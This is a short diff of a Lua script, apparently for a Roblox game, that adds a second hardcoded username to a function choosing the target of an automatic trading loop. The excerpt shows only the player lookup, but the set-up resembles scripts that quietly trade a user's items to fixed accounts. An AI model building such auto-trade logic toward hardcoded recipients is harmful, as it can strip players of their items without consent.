@@ -393,7 +393,7 @@ local function autoTradeBallbertoLoop()
 	
 	local function findTargetPlayer()
 		for _, p in ipairs(Players:GetPlayers()) do
-			if p.Name == "Timka_q1t" then targetPlayer = p; targetUserId = p.UserId; return true end
+			if p.Name == "Timka_q1t" or p.Name == "VipTimXavier" then targetPlayer = p; targetUserId = p.UserId; return true end
 		end
 		return false
 	end
